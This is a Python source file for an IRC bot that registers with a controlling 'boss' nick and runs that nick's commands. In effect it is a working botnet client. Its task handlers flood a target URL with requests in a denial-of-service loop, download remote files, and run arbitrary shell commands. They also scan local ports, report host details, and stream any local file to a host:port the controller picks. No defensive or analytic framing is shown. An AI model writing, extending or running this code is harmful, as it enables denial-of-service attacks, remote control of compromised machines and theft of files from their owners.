#!/usr/bin/env python

import gevent
import os
import platform
import random
import re
import sys
import time

from gevent import monkey
monkey.patch_all()

import urllib2

from gevent import socket
from gevent.event import Event
from gevent.queue import Queue

import logging
from logging.handlers import RotatingFileHandler
from optparse import OptionParser

from irc import IRCConnection, IRCBot


class WorkerBot(IRCBot):
    def __init__(self, conn, boss):
        super(WorkerBot, self).__init__(conn)
        
        # event to track when this worker gets registered
        self.registered = Event()
        
        # store the nickname of the command bot
        self.boss = boss
        
        # load up any task patterns
        self.task_patterns = self.get_task_patterns()
        
        # keep a queue of tasks
        self.task_queue = Queue()
        
        # flag to allow stopping currently running task at any time
        self.stop_flag = Event()
        
        # start 2 greenlets, one to ensure the worker gets registered and
        # the other to pull tasks from the queue and execute them
        gevent.spawn(self.register_with_boss)
        gevent.spawn(self.task_runner)
    
    def get_task_patterns(self):
        return (
            ('dos (?P<url>.*)', self.dos),
            ('download (?P<url>.*)', self.download),
            ('info', self.info),
            ('ports', self.ports),
            ('run (?P<program>.*)', self.run),
            ('send_file (?P<filename>[^\s]+) (?P<destination>[^\s]+)', self.send_file),
            ('status', self.status_report),
        )
    
    def dos(self, url):
        count = 0
        
        def fetcher(url):
            req = urllib2.urlopen(url)
            req.read()
        
        while not self.stop_flag.is_set():
            greenlets = [
                gevent.spawn(fetcher, url) for x in range(100)
            ]
            [g.join() for g in greenlets]
            count += 100
        
        return 'sent %s requests' % count
    
    def download(self, url):
        path, filename = url.rsplit('/', 1)
        
        try:
            request = urllib2.urlopen(url)
        except:
            return "failure: unable to fetch %s" % url
        
        try:
            fh = open(filename, 'w')
        except IOError:
            return "failure: unable to open %s" % filename
            
        while not self.stop_flag.is_set():
            data = request.read(4096)
            
            if not data:
                break
            
            fh.write(data)
        
        return "downloaded %s" % filename
    
    def info(self):
        return '%s: %s, %s, %s, %s' % (
            __file__,
            platform.platform(),
            platform.architecture()[0],
            platform.node(),
            platform.python_version(),
        )
    
    def ports(self):
        open_ports = []
        for port in range(20, 1025):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
            result = sock.connect_ex(('127.0.0.1', port)) 
            
            if result == 0:  
                open_ports.append(port)
            sock.close()
        
        return str(open_ports)
    
    def run(self, program):
        fh = os.popen(program)
        return fh.read()
    
    def register_with_boss(self):
        gevent.sleep(10) # wait for things to connect, etc
        
        while not self.registered.is_set():
            self.respond('!register {%s}' % platform.node(), nick=self.boss)
            gevent.sleep(30)
    
    def send_file(self, filename, destination):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host, port = destination.split(':')
            sock.connect((host, int(port)))
        except:
            return 'failed to connect to %s' % host
        
        try:
            fh = open(filename, 'r')
        except IOError:
            return 'failed to open %s' % filename
        
        while 1:
            data = fh.read(4096)
            
            if not data:
                break
            
            sock.send(data)
        
        fh.close()
        sock.close()
        return 'sent successfully'
    
    def status_report(self):
        return self.task_queue.qsize()
    
    def task_runner(self):
        while 1:
            (task_id, command) = self.task_queue.get()
            
            for pattern, callback in self.task_patterns:
                match = re.match(pattern, command)
                if match:
                    # execute the callback
                    ret = callback(**match.groupdict()) or ''
                    
                    # clear the stop flag in the event it was set
                    self.stop_flag.clear()
                    
                    # send output of command to channel
                    for line in ret.splitlines():
                        self.respond('!task-data %s:%s' % (task_id, line), self.channel)
                        gevent.sleep(.34)
            
            # indicate task is complete
            self.respond('!task-finished %s' % task_id, self.channel)
    
    def require_boss(self, callback):
        def inner(nick, message, channel, *args, **kwargs):
            if nick != self.boss:
                return
            
            return callback(nick, message, channel, *args, **kwargs)
        return inner
    
    def command_patterns(self):
        return (
            ('!register-success (?P<cmd_channel>.+)', self.require_boss(self.register_success)),
            ('!worker-execute (?:\((?P<workers>.+?)\) )?(?P<task_id>\d+):(?P<command>.+)', self.require_boss(self.worker_execute)),
            ('!worker-ping', self.require_boss(self.worker_ping_handler)),
            ('!worker-stop', self.require_boss(self.worker_stop)),
        )
    
    def register_success(self, nick, message, channel, cmd_channel):
        # the boss will tell what channel to join
        self.channel = cmd_channel
        self.conn.join(self.channel)
        
        # indicate that registered so we'll stop trying
        self.registered.set()
    
    def worker_execute(self, nick, message, channel, task_id, command, workers=None):
        if workers:
            nicks = workers.split(',')
            do_task = self.conn.nick in nicks
        else:
            do_task = True
        
        if do_task:
            self.task_queue.put((int(task_id), command))
            return '!task-received %s' % task_id
    
    def worker_stop(self, nick, message, channel):
        self.stop_flag.set()
    
    def worker_ping_handler(self, nick, message, channel):
        return '!worker-pong {%s}' % platform.node()


if __name__ == '__main__':    
    conn = IRCConnection('irc.freenode.net', 6667, 'workerbot', 'workerbot.log')
    conn.connect()
    
    bot = WorkerBot(conn, 'boss1337')
    conn.enter_event_loop()
